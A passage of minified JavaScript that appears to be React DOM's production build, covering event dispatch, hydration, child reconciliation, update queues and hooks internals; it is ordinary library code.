le(P,C+"enter",ie,i,V),le.target=A,le.relatedTarget=nt,Y=le),nt=Y,re&&ie)t:{for(le=re,P=ie,C=0,A=le;A;A=xn(A))C++;for(A=0,Y=P;Y;Y=xn(Y))A++;for(;0<C-A;)le=xn(le),C--;for(;0<A-C;)P=xn(P),A--;for(;C--;){if(le===P||P!==null&&le===P.alternate)break t;le=xn(le),P=xn(P)}le=null}else le=null;re!==null&&Bu(K,q,re,le,!1),ie!==null&&nt!==null&&Bu(K,nt,ie,le,!0)}}e:{if(q=$?yn($):window,re=q.nodeName&&q.nodeName.toLowerCase(),re==="select"||re==="input"&&q.type==="file")var oe=Dp;else if(bu(q))if(ku)oe=Mp;else{oe=Up;var pe=zp}else(re=q.nodeName)&&re.toLowerCase()==="input"&&(q.type==="checkbox"||q.type==="radio")&&(oe=Lp);if(oe&&(oe=oe(e,$))){ju(K,oe,i,V);break e}pe&&pe(e,q,$),e==="focusout"&&(pe=q._wrapperState)&&pe.controlled&&q.type==="number"&&At(q,"number",q.value)}switch(pe=$?yn($):window,e){case"focusin":(bu(pe)||pe.contentEditable==="true")&&(pn=pe,Wl=$,fa=null);break;case"focusout":fa=Wl=pn=null;break;case"mousedown":ql=!0;break;case"contextmenu":case"mouseup":case"dragend":ql=!1,Pu(K,i,V);break;case"selectionchange":if(Wp)break;case"keydown":case"keyup":Pu(K,i,V)}var me;if(Ll)e:{switch(e){case"compositionstart":var ke="onCompositionStart";break e;case"compositionend":ke="onCompositionEnd";break e;case"compositionupdate":ke="onCompositionUpdate";break e}ke=void 0}else fn?vu(e,i)&&(ke="onCompositionEnd"):e==="keydown"&&i.keyCode===229&&(ke="onCompositionStart");ke&&(xu&&i.locale!=="ko"&&(fn||ke!=="onCompositionStart"?ke==="onCompositionEnd"&&fn&&(me=du()):(ms=V,Ol="value"in ms?ms.value:ms.textContent,fn=!0)),pe=di($,ke),0<pe.length&&(ke=new pu(ke,e,null,i,V),K.push({event:ke,listeners:pe}),me?ke.data=me:(me=wu(i),me!==null&&(ke.data=me)))),(me=Pp?Ap(e,i):Op(e,i))&&($=di($,"onBeforeInput"),0<$.length&&(V=new pu("onBeforeInput","beforeinput",null,i,V),K.push({event:V,listeners:$}),V.data=me))}Mu(K,t)})}function xa(e,t,i){return{instance:e,listener:t,currentTarget:i}}function di(e,t){for(var i=t+"Capture",o=[];e!==null;){var d=e,f=d.stateNode;d.tag===5&&f!==null&&(d=f,f=mr(e,i),f!=null&&o.unshift(xa(e,f,d)),f=mr(e,t),f!=null&&o.push(xa(e,f,d))),e=e.return}return o}function xn(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Bu(e,t,i,o,d){for(var f=t._reactName,g=[];i!==null&&i!==o;){var b=i,N=b.alternate,$=b.stateNode;if(N!==null&&N===o)break;b.tag===5&&$!==null&&(b=$,d?(N=mr(i,f),N!=null&&g.unshift(xa(i,N,b))):d||(N=mr(i,f),N!=null&&g.push(xa(i,N,b)))),i=i.return}g.length!==0&&e.push({event:t,listeners:g})}var Kp=/\r\n?/g,Gp=/\u0000|\uFFFD/g;function Wu(e){return(typeof e=="string"?e:""+e).replace(Kp,`
`).replace(Gp,"")}function hi(e,t,i){if(t=Wu(t),Wu(e)!==t&&i)throw Error(n(425))}function fi(){}var Yl=null,Ql=null;function Xl(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Zl=typeof setTimeout=="function"?setTimeout:void 0,Jp=typeof clearTimeout=="function"?clearTimeout:void 0,qu=typeof Promise=="function"?Promise:void 0,Yp=typeof queueMicrotask=="function"?queueMicrotask:typeof qu<"u"?function(e){return qu.resolve(null).then(e).catch(Qp)}:Zl;function Qp(e){setTimeout(function(){throw e})}function eo(e,t){var i=t,o=0;do{var d=i.nextSibling;if(e.removeChild(i),d&&d.nodeType===8)if(i=d.data,i==="/$"){if(o===0){e.removeChild(d),ia(t);return}o--}else i!=="$"&&i!=="$?"&&i!=="$!"||o++;i=d}while(i);ia(t)}function gs(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function Vu(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var i=e.data;if(i==="$"||i==="$!"||i==="$?"){if(t===0)return e;t--}else i==="/$"&&t++}e=e.previousSibling}return null}var gn=Math.random().toString(36).slice(2),zr="__reactFiber$"+gn,ga="__reactProps$"+gn,Hr="__reactContainer$"+gn,to="__reactEvents$"+gn,Xp="__reactListeners$"+gn,Zp="__reactHandles$"+gn;function Fs(e){var t=e[zr];if(t)return t;for(var i=e.parentNode;i;){if(t=i[Hr]||i[zr]){if(i=t.alternate,t.child!==null||i!==null&&i.child!==null)for(e=Vu(e);e!==null;){if(i=e[zr])return i;e=Vu(e)}return t}e=i,i=e.parentNode}return null}function ya(e){return e=e[zr]||e[Hr],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function yn(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(n(33))}function pi(e){return e[ga]||null}var ro=[],vn=-1;function ys(e){return{current:e}}function Ke(e){0>vn||(e.current=ro[vn],ro[vn]=null,vn--)}function qe(e,t){vn++,ro[vn]=e.current,e.current=t}var vs={},Nt=ys(vs),It=ys(!1),Bs=vs;function wn(e,t){var i=e.type.contextTypes;if(!i)return vs;var o=e.stateNode;if(o&&o.__reactInternalMemoizedUnmaskedChildContext===t)return o.__reactInternalMemoizedMaskedChildContext;var d={},f;for(f in i)d[f]=t[f];return o&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=d),d}function $t(e){return e=e.childContextTypes,e!=null}function mi(){Ke(It),Ke(Nt)}function Hu(e,t,i){if(Nt.current!==vs)throw Error(n(168));qe(Nt,t),qe(It,i)}function Ku(e,t,i){var o=e.stateNode;if(t=t.childContextTypes,typeof o.getChildContext!="function")return i;o=o.getChildContext();for(var d in o)if(!(d in t))throw Error(n(108,Q(e)||"Unknown",d));return ee({},i,o)}function xi(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||vs,Bs=Nt.current,qe(Nt,e),qe(It,It.current),!0}function Gu(e,t,i){var o=e.stateNode;if(!o)throw Error(n(169));i?(e=Ku(e,t,Bs),o.__reactInternalMemoizedMergedChildContext=e,Ke(It),Ke(Nt),qe(Nt,e)):Ke(It),qe(It,i)}var Kr=null,gi=!1,so=!1;function Ju(e){Kr===null?Kr=[e]:Kr.push(e)}function em(e){gi=!0,Ju(e)}function ws(){if(!so&&Kr!==null){so=!0;var e=0,t=Me;try{var i=Kr;for(Me=1;e<i.length;e++){var o=i[e];do o=o(!0);while(o!==null)}Kr=null,gi=!1}catch(d){throw Kr!==null&&(Kr=Kr.slice(e+1)),W(Vr,ws),d}finally{Me=t,so=!1}}return null}var bn=[],jn=0,yi=null,vi=0,sr=[],nr=0,Ws=null,Gr=1,Jr="";function qs(e,t){bn[jn++]=vi,bn[jn++]=yi,yi=e,vi=t}function Yu(e,t,i){sr[nr++]=Gr,sr[nr++]=Jr,sr[nr++]=Ws,Ws=e;var o=Gr;e=Jr;var d=32-xr(o)-1;o&=~(1<<d),i+=1;var f=32-xr(t)+d;if(30<f){var g=d-d%5;f=(o&(1<<g)-1).toString(32),o>>=g,d-=g,Gr=1<<32-xr(t)+d|i<<d|o,Jr=f+e}else Gr=1<<f|i<<d|o,Jr=e}function no(e){e.return!==null&&(qs(e,1),Yu(e,1,0))}function ao(e){for(;e===yi;)yi=bn[--jn],bn[jn]=null,vi=bn[--jn],bn[jn]=null;for(;e===Ws;)Ws=sr[--nr],sr[nr]=null,Jr=sr[--nr],sr[nr]=null,Gr=sr[--nr],sr[nr]=null}var Kt=null,Gt=null,Je=!1,yr=null;function Qu(e,t){var i=or(5,null,null,0);i.elementType="DELETED",i.stateNode=t,i.return=e,t=e.deletions,t===null?(e.deletions=[i],e.flags|=16):t.push(i)}function Xu(e,t){switch(e.tag){case 5:var i=e.type;return t=t.nodeType!==1||i.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,Kt=e,Gt=gs(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,Kt=e,Gt=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(i=Ws!==null?{id:Gr,overflow:Jr}:null,e.memoizedState={dehydrated:t,treeContext:i,retryLane:1073741824},i=or(18,null,null,0),i.stateNode=t,i.return=e,e.child=i,Kt=e,Gt=null,!0):!1;default:return!1}}function io(e){return(e.mode&1)!==0&&(e.flags&128)===0}function lo(e){if(Je){var t=Gt;if(t){var i=t;if(!Xu(e,t)){if(io(e))throw Error(n(418));t=gs(i.nextSibling);var o=Kt;t&&Xu(e,t)?Qu(o,i):(e.flags=e.flags&-4097|2,Je=!1,Kt=e)}}else{if(io(e))throw Error(n(418));e.flags=e.flags&-4097|2,Je=!1,Kt=e}}}function Zu(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Kt=e}function wi(e){if(e!==Kt)return!1;if(!Je)return Zu(e),Je=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!Xl(e.type,e.memoizedProps)),t&&(t=Gt)){if(io(e))throw ed(),Error(n(418));for(;t;)Qu(e,t),t=gs(t.nextSibling)}if(Zu(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(n(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var i=e.data;if(i==="/$"){if(t===0){Gt=gs(e.nextSibling);break e}t--}else i!=="$"&&i!=="$!"&&i!=="$?"||t++}e=e.nextSibling}Gt=null}}else Gt=Kt?gs(e.stateNode.nextSibling):null;return!0}function ed(){for(var e=Gt;e;)e=gs(e.nextSibling)}function kn(){Gt=Kt=null,Je=!1}function oo(e){yr===null?yr=[e]:yr.push(e)}var tm=H.ReactCurrentBatchConfig;function va(e,t,i){if(e=i.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(i._owner){if(i=i._owner,i){if(i.tag!==1)throw Error(n(309));var o=i.stateNode}if(!o)throw Error(n(147,e));var d=o,f=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===f?t.ref:(t=function(g){var b=d.refs;g===null?delete b[f]:b[f]=g},t._stringRef=f,t)}if(typeof e!="string")throw Error(n(284));if(!i._owner)throw Error(n(290,e))}return e}function bi(e,t){throw e=Object.prototype.toString.call(t),Error(n(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function td(e){var t=e._init;return t(e._payload)}function rd(e){function t(P,C){if(e){var A=P.deletions;A===null?(P.deletions=[C],P.flags|=16):A.push(C)}}function i(P,C){if(!e)return null;for(;C!==null;)t(P,C),C=C.sibling;return null}function o(P,C){for(P=new Map;C!==null;)C.key!==null?P.set(C.key,C):P.set(C.index,C),C=C.sibling;return P}function d(P,C){return P=Cs(P,C),P.index=0,P.sibling=null,P}function f(P,C,A){return P.index=A,e?(A=P.alternate,A!==null?(A=A.index,A<C?(P.flags|=2,C):A):(P.flags|=2,C)):(P.flags|=1048576,C)}function g(P){return e&&P.alternate===null&&(P.flags|=2),P}function b(P,C,A,Y){return C===null||C.tag!==6?(C=ec(A,P.mode,Y),C.return=P,C):(C=d(C,A),C.return=P,C)}function N(P,C,A,Y){var oe=A.type;return oe===F?V(P,C,A.props.children,Y,A.key):C!==null&&(C.elementType===oe||typeof oe=="object"&&oe!==null&&oe.$$typeof===we&&td(oe)===C.type)?(Y=d(C,A.props),Y.ref=va(P,C,A),Y.return=P,Y):(Y=Vi(A.type,A.key,A.props,null,P.mode,Y),Y.ref=va(P,C,A),Y.return=P,Y)}function $(P,C,A,Y){return C===null||C.tag!==4||C.stateNode.containerInfo!==A.containerInfo||C.stateNode.implementation!==A.implementation?(C=tc(A,P.mode,Y),C.return=P,C):(C=d(C,A.children||[]),C.return=P,C)}function V(P,C,A,Y,oe){return C===null||C.tag!==7?(C=Xs(A,P.mode,Y,oe),C.return=P,C):(C=d(C,A),C.return=P,C)}function K(P,C,A){if(typeof C=="string"&&C!==""||typeof C=="number")return C=ec(""+C,P.mode,A),C.return=P,C;if(typeof C=="object"&&C!==null){switch(C.$$typeof){case te:return A=Vi(C.type,C.key,C.props,null,P.mode,A),A.ref=va(P,null,C),A.return=P,A;case J:return C=tc(C,P.mode,A),C.return=P,C;case we:var Y=C._init;return K(P,Y(C._payload),A)}if(st(C)||Z(C))return C=Xs(C,P.mode,A,null),C.return=P,C;bi(P,C)}return null}function q(P,C,A,Y){var oe=C!==null?C.key:null;if(typeof A=="string"&&A!==""||typeof A=="number")return oe!==null?null:b(P,C,""+A,Y);if(typeof A=="object"&&A!==null){switch(A.$$typeof){case te:return A.key===oe?N(P,C,A,Y):null;case J:return A.key===oe?$(P,C,A,Y):null;case we:return oe=A._init,q(P,C,oe(A._payload),Y)}if(st(A)||Z(A))return oe!==null?null:V(P,C,A,Y,null);bi(P,A)}return null}function re(P,C,A,Y,oe){if(typeof Y=="string"&&Y!==""||typeof Y=="number")return P=P.get(A)||null,b(C,P,""+Y,oe);if(typeof Y=="object"&&Y!==null){switch(Y.$$typeof){case te:return P=P.get(Y.key===null?A:Y.key)||null,N(C,P,Y,oe);case J:return P=P.get(Y.key===null?A:Y.key)||null,$(C,P,Y,oe);case we:var pe=Y._init;return re(P,C,A,pe(Y._payload),oe)}if(st(Y)||Z(Y))return P=P.get(A)||null,V(C,P,Y,oe,null);bi(C,Y)}return null}function ie(P,C,A,Y){for(var oe=null,pe=null,me=C,ke=C=0,gt=null;me!==null&&ke<A.length;ke++){me.index>ke?(gt=me,me=null):gt=me.sibling;var $e=q(P,me,A[ke],Y);if($e===null){me===null&&(me=gt);break}e&&me&&$e.alternate===null&&t(P,me),C=f($e,C,ke),pe===null?oe=$e:pe.sibling=$e,pe=$e,me=gt}if(ke===A.length)return i(P,me),Je&&qs(P,ke),oe;if(me===null){for(;ke<A.length;ke++)me=K(P,A[ke],Y),me!==null&&(C=f(me,C,ke),pe===null?oe=me:pe.sibling=me,pe=me);return Je&&qs(P,ke),oe}for(me=o(P,me);ke<A.length;ke++)gt=re(me,P,ke,A[ke],Y),gt!==null&&(e&&gt.alternate!==null&&me.delete(gt.key===null?ke:gt.key),C=f(gt,C,ke),pe===null?oe=gt:pe.sibling=gt,pe=gt);return e&&me.forEach(function(Ts){return t(P,Ts)}),Je&&qs(P,ke),oe}function le(P,C,A,Y){var oe=Z(A);if(typeof oe!="function")throw Error(n(150));if(A=oe.call(A),A==null)throw Error(n(151));for(var pe=oe=null,me=C,ke=C=0,gt=null,$e=A.next();me!==null&&!$e.done;ke++,$e=A.next()){me.index>ke?(gt=me,me=null):gt=me.sibling;var Ts=q(P,me,$e.value,Y);if(Ts===null){me===null&&(me=gt);break}e&&me&&Ts.alternate===null&&t(P,me),C=f(Ts,C,ke),pe===null?oe=Ts:pe.sibling=Ts,pe=Ts,me=gt}if($e.done)return i(P,me),Je&&qs(P,ke),oe;if(me===null){for(;!$e.done;ke++,$e=A.next())$e=K(P,$e.value,Y),$e!==null&&(C=f($e,C,ke),pe===null?oe=$e:pe.sibling=$e,pe=$e);return Je&&qs(P,ke),oe}for(me=o(P,me);!$e.done;ke++,$e=A.next())$e=re(me,P,ke,$e.value,Y),$e!==null&&(e&&$e.alternate!==null&&me.delete($e.key===null?ke:$e.key),C=f($e,C,ke),pe===null?oe=$e:pe.sibling=$e,pe=$e);return e&&me.forEach(function(Im){return t(P,Im)}),Je&&qs(P,ke),oe}function nt(P,C,A,Y){if(typeof A=="object"&&A!==null&&A.type===F&&A.key===null&&(A=A.props.children),typeof A=="object"&&A!==null){switch(A.$$typeof){case te:e:{for(var oe=A.key,pe=C;pe!==null;){if(pe.key===oe){if(oe=A.type,oe===F){if(pe.tag===7){i(P,pe.sibling),C=d(pe,A.props.children),C.return=P,P=C;break e}}else if(pe.elementType===oe||typeof oe=="object"&&oe!==null&&oe.$$typeof===we&&td(oe)===pe.type){i(P,pe.sibling),C=d(pe,A.props),C.ref=va(P,pe,A),C.return=P,P=C;break e}i(P,pe);break}else t(P,pe);pe=pe.sibling}A.type===F?(C=Xs(A.props.children,P.mode,Y,A.key),C.return=P,P=C):(Y=Vi(A.type,A.key,A.props,null,P.mode,Y),Y.ref=va(P,C,A),Y.return=P,P=Y)}return g(P);case J:e:{for(pe=A.key;C!==null;){if(C.key===pe)if(C.tag===4&&C.stateNode.containerInfo===A.containerInfo&&C.stateNode.implementation===A.implementation){i(P,C.sibling),C=d(C,A.children||[]),C.return=P,P=C;break e}else{i(P,C);break}else t(P,C);C=C.sibling}C=tc(A,P.mode,Y),C.return=P,P=C}return g(P);case we:return pe=A._init,nt(P,C,pe(A._payload),Y)}if(st(A))return ie(P,C,A,Y);if(Z(A))return le(P,C,A,Y);bi(P,A)}return typeof A=="string"&&A!==""||typeof A=="number"?(A=""+A,C!==null&&C.tag===6?(i(P,C.sibling),C=d(C,A),C.return=P,P=C):(i(P,C),C=ec(A,P.mode,Y),C.return=P,P=C),g(P)):i(P,C)}return nt}var _n=rd(!0),sd=rd(!1),ji=ys(null),ki=null,Nn=null,co=null;function uo(){co=Nn=ki=null}function ho(e){var t=ji.current;Ke(ji),e._currentValue=t}function fo(e,t,i){for(;e!==null;){var o=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,o!==null&&(o.childLanes|=t)):o!==null&&(o.childLanes&t)!==t&&(o.childLanes|=t),e===i)break;e=e.return}}function Sn(e,t){ki=e,co=Nn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&((e.lanes&t)!==0&&(Dt=!0),e.firstContext=null)}function ar(e){var t=e._currentValue;if(co!==e)if(e={context:e,memoizedValue:t,next:null},Nn===null){if(ki===null)throw Error(n(308));Nn=e,ki.dependencies={lanes:0,firstContext:e}}else Nn=Nn.next=e;return t}var Vs=null;function po(e){Vs===null?Vs=[e]:Vs.push(e)}function nd(e,t,i,o){var d=t.interleaved;return d===null?(i.next=i,po(t)):(i.next=d.next,d.next=i),t.interleaved=i,Yr(e,o)}function Yr(e,t){e.lanes|=t;var i=e.alternate;for(i!==null&&(i.lanes|=t),i=e,e=e.return;e!==null;)e.childLanes|=t,i=e.alternate,i!==null&&(i.childLanes|=t),i=e,e=e.return;return i.tag===3?i.stateNode:null}var bs=!1;function mo(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function ad(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Qr(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function js(e,t,i){var o=e.updateQueue;if(o===null)return null;if(o=o.shared,(Ie&2)!==0){var d=o.pending;return d===null?t.next=t:(t.next=d.next,d.next=t),o.pending=t,Yr(e,i)}return d=o.interleaved,d===null?(t.next=t,po(o)):(t.next=d.next,d.next=t),o.interleaved=t,Yr(e,i)}function _i(e,t,i){if(t=t.updateQueue,t!==null&&(t=t.shared,(i&4194240)!==0)){var o=t.lanes;o&=e.pendingLanes,i|=o,t.lanes=i,Cl(e,i)}}function id(e,t){var i=e.updateQueue,o=e.alternate;if(o!==null&&(o=o.updateQueue,i===o)){var d=null,f=null;if(i=i.firstBaseUpdate,i!==null){do{var g={eventTime:i.eventTime,lane:i.lane,tag:i.tag,payload:i.payload,callback:i.callback,next:null};f===null?d=f=g:f=f.next=g,i=i.next}while(i!==null);f===null?d=f=t:f=f.next=t}else d=f=t;i={baseState:o.baseState,firstBaseUpdate:d,lastBaseUpdate:f,shared:o.shared,effects:o.effects},e.updateQueue=i;return}e=i.lastBaseUpdate,e===null?i.firstBaseUpdate=t:e.next=t,i.lastBaseUpdate=t}function Ni(e,t,i,o){var d=e.updateQueue;bs=!1;var f=d.firstBaseUpdate,g=d.lastBaseUpdate,b=d.shared.pending;if(b!==null){d.shared.pending=null;var N=b,$=N.next;N.next=null,g===null?f=$:g.next=$,g=N;var V=e.alternate;V!==null&&(V=V.updateQueue,b=V.lastBaseUpdate,b!==g&&(b===null?V.firstBaseUpdate=$:b.next=$,V.lastBaseUpdate=N))}if(f!==null){var K=d.baseState;g=0,V=$=N=null,b=f;do{var q=b.lane,re=b.eventTime;if((o&q)===q){V!==null&&(V=V.next={eventTime:re,lane:0,tag:b.tag,payload:b.payload,callback:b.callback,next:null});e:{var ie=e,le=b;switch(q=t,re=i,le.tag){case 1:if(ie=le.payload,typeof ie=="function"){K=ie.call(re,K,q);break e}K=ie;break e;case 3:ie.flags=ie.flags&-65537|128;case 0:if(ie=le.payload,q=typeof ie=="function"?ie.call(re,K,q):ie,q==null)break e;K=ee({},K,q);break e;case 2:bs=!0}}b.callback!==null&&b.lane!==0&&(e.flags|=64,q=d.effects,q===null?d.effects=[b]:q.push(b))}else re={eventTime:re,lane:q,tag:b.tag,payload:b.payload,callback:b.callback,next:null},V===null?($=V=re,N=K):V=V.next=re,g|=q;if(b=b.next,b===null){if(b=d.shared.pending,b===null)break;q=b,b=q.next,q.next=null,d.lastBaseUpdate=q,d.shared.pending=null}}while(!0);if(V===null&&(N=K),d.baseState=N,d.firstBaseUpdate=$,d.lastBaseUpdate=V,t=d.shared.interleaved,t!==null){d=t;do g|=d.lane,d=d.next;while(d!==t)}else f===null&&(d.shared.lanes=0);Gs|=g,e.lanes=g,e.memoizedState=K}}function ld(e,t,i){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var o=e[t],d=o.callback;if(d!==null){if(o.callback=null,o=i,typeof d!="function")throw Error(n(191,d));d.call(o)}}}var wa={},Ur=ys(wa),ba=ys(wa),ja=ys(wa);function Hs(e){if(e===wa)throw Error(n(174));return e}function xo(e,t){switch(qe(ja,t),qe(ba,e),qe(Ur,wa),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:fr(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=fr(t,e)}Ke(Ur),qe(Ur,t)}function En(){Ke(Ur),Ke(ba),Ke(ja)}function od(e){Hs(ja.current);var t=Hs(Ur.current),i=fr(t,e.type);t!==i&&(qe(ba,e),qe(Ur,i))}function go(e){ba.current===e&&(Ke(Ur),Ke(ba))}var Ye=ys(0);function Si(e){for(var t=e;t!==null;){if(t.tag===13){var i=t.memoizedState;if(i!==null&&(i=i.dehydrated,i===null||i.data==="$?"||i.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var yo=[];function vo(){for(var e=0;e<yo.length;e++)yo[e]._workInProgressVersionPrimary=null;yo.length=0}var Ei=H.ReactCurrentDispatcher,wo=H.ReactCurrentBatchConfig,Ks=0,Qe=null,ut=null,mt=null,Ci=!1,ka=!1,_a=0,rm=0;function St(){throw Error(n(321))}function bo(e,t){if(t===null)return!1;for(var i=0;i<t.length&&i<e.length;i++)if(!gr(e[i],t[i]))return!1;return!0}function jo(e,t,i,o,d,f){if(Ks=f,Qe=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Ei.current=e===null||e.memoizedState===null?im:lm,e=i(o,d),ka){f=0;do{if(ka=!1,_a=0,25<=f)throw Error(n(301));f+=1,mt=ut=null,t.updateQueue=null,Ei.current=om,e=i(o,d)}while(ka)}if(Ei.current=Pi,t=ut!==null&&ut.next!==null,Ks=0,mt=ut=Qe=null,Ci=!1,t)throw Error(n(300));return e}function ko(){var e=_a!==0;return _a=0,e}function Lr(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return mt===null?Qe.memoizedState=mt=e:mt=mt.next=e,mt}function ir(){if(ut===null){var e=Qe.alternate;e=e!==null?e.memoizedState:null}else e=ut.next;var t=mt===null?Qe.memoizedState:mt.next;if(t!==null)mt=t,ut=e;else{if(e===null)throw Error(n(310));ut=e,e={memoizedState:ut.memoizedState,baseState:ut.baseState,baseQueue:ut.baseQueue,queue:ut.queue,next:null},mt===null?Qe.memoizedState=mt=e:mt=mt.next=e}return mt}function Na(e,t){return typeof t=="function"?t(e):t}function _o(e){var t=ir(),i=t.queue;if(i===null)throw Error(n(311));i.lastRenderedReducer=e;var o=ut,d=o.baseQueue,f=i.pending;if(f!==null){if(d!==null){var g=d.next;d.next=f.next,f.next=g}o.baseQueue=d=f,i.pending=null}if(d!==null){f=d.next,o=o.baseState;var b=g=null,N=null,$=f;do{var V=$.lane;if((Ks&V)===V)N!==null&&(N=N.next={lane:0,action:$.action,hasEagerState:$.hasEagerState,eagerState:$.eagerState,next:null}),o=$.hasEagerState?$.eagerState:e(o,$.action);else{var K={lane:V,action:$.action,hasEagerState:$.hasEagerState,eagerState:$.eagerState,next:null};N===null?(b=N=K,g=o):N=N.next=K,Qe.lanes|=V,Gs|=V}$=$.next}while($!==null&&$!==f);N===null?g=o:N.next=b,gr(o,t.memoizedState)||(Dt=!0),t.memoizedState=o,t.baseState=g,t.baseQueue=N,i.lastRenderedState=o}if(e=i.interleaved,e!==null){d=e;do f=d.lane,Qe.lanes|=f,Gs|=f,d=d.next;while(d!==e)}else d===null&&(i.lanes=0);return[t.memoizedState,i.dispatch]}function No(e){var t=ir(),i=t.queue;if(i===null)throw Error(n(311));i.lastRenderedReducer=e;var o=i.dispatch,d=i.pending,f=t.memoizedState;if(d!==null){i.pending=null;var g=d=d.next;do f=e(f,g.action),g=g.next;while(g!==d);gr(f,t.memoizedState)||(Dt=!0),t.memoizedState=f,t.baseQueue===null&&(t.baseState=f),i.lastRenderedState=f}return[f,o]}function cd(){}function ud(e,t){var i=Qe,o=ir(),d=t(),f=!gr(o.memoizedState,d);if(f&&(o.memoizedState=d,Dt=!0),o=o.queue,So(fd.bind(null,i,o,e),[e]),o.getSnapshot!==t||f||mt!==null&&mt.memoizedState.tag&1){if(i.flags|=2048,Sa(9,hd.bind(null,i,o,d,t),void 0,null),xt===null)throw Error(n(349));(Ks&30)!==0||dd(i,t,d)}return d}function dd(e,t,i){e.flags|=16384,e={getSnapshot:t,value:i},t=Qe.updateQueue,t===null?(t={lastEffect:null,stores:null},Qe.updateQueue=t,t.stores=[e]):(i=t.stores,i===null?t.stores=[e]:i.push(e))}function hd(e,t,i,o){t.value=i,t.getSnapshot=o,pd(t)&&md(e)}function fd(e,t,i){return i(function(){pd(t)&&md(e)})}function pd(e){var t=e.getSnapshot;e=e.value;try{var i=t();return!gr(e,i)}catch{return!0}}function md(e){var t=Yr(e,1);t!==null&&jr(t,e,1,-1)}function xd(e){var t=Lr();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Na,lastRenderedState:e},t.queue=e,e=e.dispatch=am.bind(null,Qe,e),[t.memoizedState,e]}function Sa(e,t,i,o){return e={tag:e,create:t,destroy:i,deps:o,next:null},t=Qe.updateQueue,t===null?(t={lastEffect:null,stores:null},Qe.updateQueue=t,t.lastEffect=e.next=e):(i=t.lastEffect,i===null?t.lastEffect=e.next=e:(o=i.next,i.next=e,e.next=o,t.lastEffect=e)),e}function gd(){return ir().memoizedState}function Ti(e,t,i,o){var d=Lr();Qe.flags|=e,d.memoizedState=Sa(1|t,i,void 0,o===void 0?null:o)}function Ri(e,t,i,o){var d=ir();o=o===void 0?null:o;var f=void 0;if(ut!==null){var g=ut.memoizedState;if(f=g.destroy,o!==null&&bo(o,g.deps)){d.memoizedState=Sa(t,i,f,o);return}}Qe.flags|=e,d.memoizedState=Sa(1|t,i,f,o)}function yd(e,t){return Ti(8390656,8,e,t)}function So(e,t){return Ri(2048,8,e,t)}function vd(e,t){return Ri(4,2,e,t)}function wd(e,t){return Ri(4,4,e,t)}function bd(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function jd(e,t,i){return i=i!=null?i.concat([e]):null,Ri(4,4,bd.bind(null,t,e),i)}function Eo(){}function kd(e,t){var i=ir();t=t===void 0?null:t;var o=i.memoizedState;return o!==null&&t!==null&&bo(t,o[1])?o[0]:(i.memoizedState=[e,t],e)}function _d(e,t){var i=ir();t=t===void 0?null:t;var o=i.memoizedState;return o!==null&&t!==null&&bo(t,o[1])?o[0]:(e=e(),i.memoizedState=[e,t],e)}function Nd(e,t,i){return(Ks&21)===0?(e.baseState&&(e.baseState=!1,Dt=!0),e.memoizedState=i):(gr(i,t)||(i=tu(),Qe.lanes|=i,Gs|=i,e.baseState=!0),t)}function sm(e,t){var i=Me;Me=i!==0&&4>i?i:4,e(!0);var o=wo.transition;wo.transition={};try{e(!1),t()}finally{Me=i,wo.transition=o}}function Sd(){return ir().memoizedState}function nm(e,t,i){var o=Ss(e);if(i={lane:o,action:i,hasEagerState:!1,eagerState:null,next:null},Ed(e))Cd(t,i);else if(i=nd(e,t,i,o),i!==null){var d=Pt();jr(i,e,o,d),Td(i,t,o)}}function am(e,t,i){var 